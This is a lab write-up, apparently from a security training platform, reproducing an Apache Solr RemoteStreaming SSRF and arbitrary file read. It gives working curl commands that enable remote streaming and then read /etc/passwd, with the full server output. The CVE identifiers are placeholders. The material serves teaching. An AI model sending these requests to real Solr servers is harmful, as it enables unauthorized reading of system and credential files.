# Apache Solr RemoteStreaming File Read and SSRF Vulnerability

> [中文文档](README.md)

| Attribute | Details |
|-----------|---------|
| **CVE ID** | CNVD-2019-xxxxx |
| **Affected Versions** | Apache Solr |
| **Vulnerability Type** | SSRF / Arbitrary File Read |
| **Severity** | 🔴 High |
| **Default Port** | 8983 |
| **Vulnerability Link** | [NVD - CVE-2019-xxxxx](https://nvd.nist.gov/vuln/detail/CVE-2019-xxxxx) |



## Overview

`Apache Solr` is an open-source search server. When `Apache Solr` does not have authentication enabled, attackers can directly craft specific requests to enable certain configurations, ultimately causing `SSRF` or arbitrary file read.



## Reproduction

After the target machine starts, access `http://your-ip:8983` to view the `Apache Solr` dashboard:

![Solr Dashboard](https://static.nextcyber.cn/attachments/images/course/task/0ae0a7164b204a48aa4c4f247c62fc49.png)

The target is running `solr 8.8.1`. First, get the `database name` by accessing:

```
http://your-ip:8983/solr/admin/cores?indexInfo=false&wt=json
```

![Get Database Name](https://static.nextcyber.cn/attachments/images/course/task/0093b60c72de4803badcc2c783d1558f.png)

Send the following packet to modify the `demo` database configuration and enable `RemoteStreaming`:

```
curl -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' --data-binary $'{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}' \
    $'http://your-ip:8983/solr/demo/config'
```

```
┌──(root㉿nextcyber)-[~]
└─# curl -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' --data-binary $'{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}' \
    $'http://192.168.1.3:8983/solr/demo/config'
HTTP/1.1 200 OK
Content-Security-Policy: default-src 'none'; base-uri 'none'; connect-src 'self'; form-action 'self'; font-src 'self'; frame-ancestors 'none'; img-src 'self'; media-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self'; worker-src 'self';
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Content-Type: text/plain;charset=utf-8
Content-Length: 149

{
  "responseHeader":{
    "status":0,
    "QTime":234},
  "WARNING":"This response format is experimental.  It is likely to change in the future."}
```

## Exploitation

Finally, read arbitrary files through `stream.url`:

```
curl -i -s -k 'http://your-ip:8983/solr/demo/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd'
```

```
┌──(root㉿nextcyber)-[~]
└─# curl -i -s -k 'http://192.168.1.3:8983/solr/demo/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd'
HTTP/1.1 200 OK
Content-Security-Policy: default-src 'none'; base-uri 'none'; connect-src 'self'; form-action 'self'; font-src 'self'; frame-ancestors 'none'; img-src 'self'; media-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self'; worker-src 'self';
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Content-Type: application/json;charset=utf-8
Content-Length: 1497

{
  "responseHeader":{
    "status":0,
    "QTime":14,
    "handler":"org.apache.solr.handler.DumpRequestHandler",
    "params":{
      "param":"ContentStreams",
      "stream.url":"file:///etc/passwd"}},
  "params":{
    "stream.url":"file:///etc/passwd",
    "echoHandler":"true",
    "param":"ContentStreams",
    "echoParams":"explicit"},
  "streams":[{
      "name":null,
      "sourceInfo":"url",
      "size":null,
      "contentType":null,
      "stream":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n"}],
  "context":{
    "webapp":"/solr",
    "path":"/debug/dump",
    "httpMethod":"GET"}}
```

Successfully read the `/etc/passwd` file.



##靶场练习

前往 [NextCyber 靶场](https://app.nextcyber.cn/courses/150) 在线实战演练上述漏洞。



> ⚠️ **Disclaimer**: All content in this directory is for learning and research purposes only. Please do not use it for illegal purposes.
